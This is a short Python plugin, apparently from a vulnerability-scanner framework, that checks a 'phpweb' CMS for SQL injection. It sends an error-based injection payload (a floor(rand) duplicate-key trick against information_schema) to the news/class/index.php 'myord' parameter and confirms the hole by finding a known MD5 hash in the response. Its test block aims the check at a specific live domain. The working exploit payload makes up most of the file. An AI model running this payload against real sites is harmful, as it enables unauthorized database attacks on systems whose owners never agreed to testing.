#!/usr/bin/env python
# -*- coding: utf-8 -*-
def assign(service, arg):
    if service == "phpweb":
        return True, arg

def audit(arg):
    url = arg + 'news/class/index.php?myord=1%20and%20(select%201%20from%20(select%20count(*),concat(md5(521521),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1'
    _, head, body, _, _ = curl.curl(url)
    if body and body.find('35fd19fbe470f0cb5581884fa700610f') != -1:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpweb', 'http://www.jxcfs.com/')[1])
